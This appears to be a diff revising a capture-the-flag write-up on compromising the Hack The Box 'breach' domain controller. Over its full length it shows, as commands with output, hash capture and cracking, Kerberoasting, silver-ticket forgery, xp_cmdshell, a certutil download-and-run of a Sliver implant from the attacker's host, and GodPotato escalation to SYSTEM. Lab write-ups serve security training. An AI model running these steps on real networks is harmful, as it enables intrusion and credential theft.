@@ -1,8 +1,8 @@
 
-## Nmap Scan
+![[Pasted image 20251029221058.png]]
 
 Nmap scan of the target host
-```
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb]
 └─$ nmap -A -Pn 10.129.38.236
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 22:54 PDT
@@ -92,23 +92,28 @@ Nmap done: 1 IP address (1 host up) scanned in 106.28 seconds
 
 ```
 
-As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using tooling for this purpose
+As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using standard TTPs, and some tooling I wrote for this purpose
+
 https://github.com/SYANiDE-/tooling
 
-- entries in /etc/hosts
-	- `echo "10.129.38.236 breachdc.breach.vl breach.vl breach breachdc" | sudo tee -a /etc/hosts`
-- /etc/resolv.conf
-	- `domain breach.vl`
-	- `nameserver 10.129.38.236`
-- /etc/krb5.conf
-	- `sudo make_krb5.conf.py -d breachdc.breach.vl -w`
-- timesync to the domain controller
-	- `sudo systemctl start vbox-disable-timesync.service`
-	- `sudo ntpdate -u breachdc`
-
-### Enumeration
-The guest account is enabled
 ```
+- entries in /etc/hosts
+	- echo "10.129.38.236 breachdc.breach.vl breach.vl breach breachdc" | sudo tee -a /etc/hosts
+- /etc/resolv.conf
+	- domain breach.vl
+	- nameserver 10.129.38.236
+- /etc/krb5.conf
+	- sudo make_krb5.conf.py -d breachdc.breach.vl -w
+- timesync to the domain controller
+	- sudo systemctl start vbox-disable-timesync.service
+	- sudo ntpdate -u breachdc
+```
+
+## enumeration
+
+The guest account is enabled
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb]
 └─$ nxc smb breachdc.breach.vl -u guest -p ""
 SMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
@@ -116,7 +121,8 @@ SMB         10.129.38.236   445    BREACHDC         [+] breach.vl\guest:
 ```
 
 The guest account has read/write on the `share` share, and read permissions on the `users` share.
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb]
 └─$ nxc smb breachdc.breach.vl -u guest -p "" --shares
 SMB         10.129.38.236   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
@@ -134,7 +140,8 @@ SMB         10.129.38.236   445    BREACHDC         Users           READ
 ```
 
 In the `share` share:
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb]
 └─$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-pass
 
@@ -156,12 +163,13 @@ drw-rw-rw-          0  Thu Feb 17 03:23:22 2022 diana.pope
 drw-rw-rw-          0  Wed Apr 16 17:38:12 2025 julia.wong
 ```
 
-None of these directories are accessible by guest.  But they are usernames, which might come in handy.
+None of these directories are accessible by `guest`.  But they are usernames, which might come in handy.
 
 The other folders, `finance` and `software` are empty.
 
-These users don't have DONT_REQUIRE_PREAUTH set
-```
+These users don't have `DONT_REQUIRE_PREAUTH` set
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-GetNPUsers -dc-host breachdc.breach.vl -usersfile users.txt breach.vl/guest -no-pass
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -171,15 +179,16 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] User julia.wong doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-I used the slinky module to place an .ico on the `share` share, 
-```
+I used the `crackmapexec` `slinky` module to place an `.ico` on the `share` share, 
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ nxc smb breachdc.breach.vl -u guest -p "" -M slinky -o SERVER=10.10.14.204 NAME=funtime ICO_URI=\\\\10.10.14.204\\test\\icon.ico SHARES=share/software IGNORE=c\$,admin\$,netlogon,sysvol,users --smb-timeout 10
-
 ```
 
-downloaded it, then re-uploaded it into all three folders using impacket-smbclient:
-```
+downloaded it, then re-uploaded it into all three folders using `impacket-smbclient`:
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-smbclient breach.vl/guest@breachdc.breach.vl -no-passImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -200,7 +209,8 @@ drw-rw-rw-          0  Sat Oct 25 01:20:34 2025 transfer
 ```
 
 Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP authentication
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 2 ~/htb/machines/breach]
 └─$ sudo responder -I tun0 -A
 [sudo] password for notroot: 
@@ -284,7 +294,7 @@ Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP a
 ```
 
 I was then able to crack the hash quite easily
-```
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ hashcat --identify julia.wong.netntlmv2-ssp 
 The following hash-mode match the structure of your input hash:
@@ -305,7 +315,7 @@ julia.wong:Computer1
 ```
 
 Get a ccache
-```
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-getTGT breach.vl/julia.wong:Computer1
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -327,8 +337,9 @@ Valid starting       Expires              Service principal
 
 ## What can julia.wong do
 
-read/write on the `share` share, and read on the `users` share
-```
+The user can read/write on the `share` share, and read on the `users` share
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ nxc smb breachdc.breach.vl -k --use-kcache --shares
 SMB         breachdc.breach.vl 445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
@@ -345,10 +356,11 @@ SMB         breachdc.breach.vl 445    BREACHDC         SYSVOL          READ     
 SMB         breachdc.breach.vl 445    BREACHDC         Users           READ
 ```
 
-Nothing particularly interesting in the `users` share for julia.wong, but the `share` share, julia.wong directory, found a user.txt.
+Nothing particularly interesting in the `users` share for `julia.wong`, but the `share` share, `julia.wong` directory, found a `user.txt`.
 
 Flag:
-```
+
+```sh
 # pwd
 /transfer/julia.wong
 # cat user.txt
@@ -356,7 +368,8 @@ Flag:
 ```
 
 Get a list of usernames
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-GetADUsers -k -no-pass -all breach.vl/julia.wong@breachdc.breach.vl  | awk '{print $1}'
 Impacket
@@ -381,19 +394,18 @@ Christine.Bruce
 svc_mssql
 ```
 
-When trying to kerberoast users, I found a type 18 hash for krbtgt (typically uncrackable), and a type 23 for user svc_mssql, really only the latter is interesting/likely.
-```
+When trying to kerberoast users, I found a type 18 hash for `krbtgt` (typically that account is uncrackable), and a type 23 for user `svc_mssql`, really only the latter is interesting/likely.
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-GetUserSPNs -k -no-pass -usersfile usernames.txt breach.vl/julia.wong@breachdc.breach.vl
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [...]
 $krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc
-
 ```
 
 
-```
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ hashcat --identify svc_mssql.hash 
 The following hash-mode match the structure of your input hash:
@@ -409,12 +421,14 @@ $krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$a5e7289dba70d9f14d87fe9a9c755c68$5fa
 ```
 
 Credential:
+
 ```
 svc_mssql:Trustno1
 ```
 
 Get a ccache
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-getTGT breach.vl/svc_mssql:Trustno1
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -422,9 +436,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in svc_mssql.ccache
 ```
 
-This is a good start.  Lets examine with Bloodhound.
+This is a good start.  Lets examine with `Bloodhound`.
 
-```
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ bloodhound-ce-python -k -no-pass -d breach.vl -u julia.wong -dc breachdc.breach.vl -c all --zip -op bloody
 INFO: BloodHound.py for BloodHound Community Edition
@@ -449,11 +463,11 @@ INFO: Compressing output into 20251025015627_bloodhound.zip
 
 ```
 
-Interestingly, Julia.wong is a member of Staff and Print Operators.
+Interestingly, `Julia.wong` is a member of `Staff` and `Print Operators`.
 
-![[Pasted_image_20251025020124.png]]
+![[Pasted image 20251025020124.png]]
 
-There is nothing particularly interesting about the Staff group, but Print Operators:
+There is nothing particularly interesting about the `Staff` group, but `Print Operators`:
 https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators
 ```
 The **Print Operators** group is a highly privileged group in Windows that grants its members several significant permissions, including:
@@ -465,19 +479,21 @@ The **Print Operators** group is a highly privileged group in Windows that grant
 - The ability to log on locally to a Domain Controller and shut it down.
 ```
 
-There is also the potential to execute shellcode in the context of NT AUTHORITY\\System, using the Capcom.sys driver.
+There is also the potential to execute shellcode in the context of `NT AUTHORITY\System`, using the `Capcom.sys` driver.
 
 Maybe this is something, maybe it is not.  I might circle back to this. 
 
-One other thing I saw was that there is a domain admin user, christine.bruce, which has password not required set:
+One other thing I saw was that there is a domain admin user, `christine.bruce`, which has password not required set:
 
-![[Pasted_image_20251025025356.png]]
+![[Pasted image 20251025025356.png]]
 
 That is pretty interesting, but not sure how that could work out from here.
 
-## Get shell
-Both of my controlled users are guests on the mssql instance
-```
+## Get a shell
+
+Both of my controlled users are guests on the `mssql` instance
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-mssqlclient breach.vl/julia.wong:Computer1@breachdc.breach.vl -windows-auth
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -507,7 +523,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 SQL (BREACH\svc_mssql  guest@master)> exit
 ```
 
-I do have the credentials for the svc_mssql user, and their spn is `MSSQLSvc/breachdc.breach.vl:1433`.  I could forge a silver ticket for that SPN for christine.  Lets do that
+I do have the credentials for the `svc_mssql` user, and their SPN is `MSSQLSvc/breachdc.breach.vl:1433`.  I could forge a silver ticket for that SPN for `christine`.  Lets do that
 
 ```python
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
@@ -528,8 +544,9 @@ print(f"Password: {password}")
 print(f"NTLM Hash: {ntlm_hash}")
 ```
 
-Hash svc_mssqls password
-```
+Hash `svc_mssqls` password using the above script
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ ~/bin/password_to_ntlm_hash.py
 Give password:> Trustno1
@@ -537,8 +554,9 @@ Password: Trustno1
 NTLM Hash: 69596c7aa1e8daee17f8e78870e25a5c
 ```
 
-Forge a service ticket for christine.bruce, for the MSSQLSvc/ SPN.
-```
+Forge a service ticket for `christine.bruce`, for the `MSSQLSvc/` SPN.
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ impacket-ticketer -domain breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl:1433 -nthash 69596c7aa1e8daee17f8e78870e25a5c christine.bruce
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -557,8 +575,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in christine.bruce.ccache
 ```
 
-My access when connecting to the mssql instance with these credentials is dbo
-```
+My access when connecting to the `mssql` instance with these credentials is `dbo`
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ KRB5CCNAME=$(pwd)/christine.bruce.ccache impacket-mssqlclient -k -no-pass breach.vl/christine.bruce@breachdc.breach.vl
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -574,15 +593,17 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 SQL (BREACH\Administrator  dbo@master)>
 ```
 
-Enable xp_cmdshell
-```
+Enable `xp_cmdshell`
+
+```sh
 SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
 INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
 INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 ```
 
-Start sliver-server, enabling multiplayer, also stand up an mtls listener on 8443 with a timeout of 240.
-```
+Start `sliver-server`, enabling `multiplayer`, also stand up an `mtls listener` on `8443` with a ``timeout`` of `240`.
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ sliver-server
 [*] Loaded 23 aliases from disk
@@ -616,16 +637,17 @@ All hackers gain annihilator
 ```
 
 Generate a new operator profile
-```
+
+```sh
 [server] sliver > new-operator --lhost 10.10.14.204 --save duff --name duff
 
 [*] Generating new client certificate, please wait ... 
 [*] Saved new client config to: /home/notroot/htb/machines/breach/duff 
-
 ```
 
-In another shell, import the profile into sliver-client.  Connect.
-```
+In another shell, import the profile into `sliver-client`.  Connect.
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ sliver-client import duff
 2025/10/25 03:26:23 Saved new client config to: /home/notroot/.sliver-client/configs/duff_10.10.14.204.cfg
@@ -654,7 +676,8 @@ sliver >
 ```
 
 Generate an implant
-```
+
+```sh
 sliver > generate -l -G -t 240 -m 10.10.14.204:8443 -a amd64 -o windows -j 60 -s a.exe
 
 [*] Generating new windows/amd64 implant binary
@@ -665,13 +688,14 @@ sliver > generate -l -G -t 240 -m 10.10.14.204:8443 -a amd64 -o windows -j 60 -s
 ```
 
 Serve it
-```
+
+```sh
 ┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/breach]
 └─$ python3 -m http.server 443
 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
 ```
 
-On the mssqlclient, use xp_cmdshell to download the implant to the host
+On the `mssqlclient`, use `xp_cmdshell` to download the implant to the host
 
 ```
 SQL (BREACH\Administrator  dbo@master)> xp_cmdshell cmd.exe /c certutil -urlcache -split -f http://10.10.14.204:443/a.exe  \windows\tasks\a.exe
@@ -689,12 +713,14 @@ NULL
 ```
 
 Invoke the implant
-```
+
+```sh
 SQL (BREACH\Administrator  dbo@master)> xp_cmdshell cmd.exe /c \windows\tasks\a.exe
 ```
 
-The user context is high integrity, with SeImpersonatePrivilege.
-```
+The user context is high integrity, with `SeImpersonatePrivilege`.
+
+```sh
 PS C:\Windows\system32> whoami /groups
 whoami /groups
 
@@ -743,20 +769,24 @@ breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115
 
 
 ## Escalate
-Upload GodPotato.exe
-```
+
+Upload `GodPotato.exe`
+
+```sh
 sliver (COLOURFUL_GUILTY) > upload /var/www/html/GodPotato-NET4.exe /windows/tasks/godpotato.exe
 
 [*] Wrote file to C:\windows\tasks\godpotato.exe
 ```
 
-Loosen dacls around the implant
-```
+Loosen DACLs around the implant (so that other users, like NT AUTHORITY\System can read/execute).  This is needed because files written here are by default only permitted read/exec by the user who wrote them, even administrators and SYSTEM are denied by default.
+
+```sh
 $path="c:\windows\tasks"; (Get-ChildItem -path $path\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","none","none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}
 ```
 
-Godpotato for escalation
-```
+`Godpotato` for escalation
+
+```sh
 PS C:\Windows\system32> cd \windows\tasks
 cd \windows\tasks
 PS C:\windows\tasks> .\godpotato.exe -cmd "cmd.exe /c .\a.exe"
@@ -788,8 +818,9 @@ PS C:\windows\tasks> .\godpotato.exe -cmd "cmd.exe /c .\a.exe"
 [*] process start with pid 3004
 ```
 
-On the new session, I am system.
-```
+On the new session, I am `NT AUTHORITY\SYSTEM`.
+
+```sh
 sliver (COLOURFUL_GUILTY) > info
 
         Session ID: c80f5dd8-d782-4bbf-abf6-1b18fb9fd2f5
@@ -822,8 +853,11 @@ Logon ID: NT AUTHORITY\SYSTEM
 ```
 
 Flag
-```
+
+```sh
 sliver (COLOURFUL_GUILTY) > cat c:/users/administrator/desktop/root.txt
 
 fc98f418f94f8cdb9a30ef026fe64345
 ```
+
+![[Pasted image 20251029221158.png]]
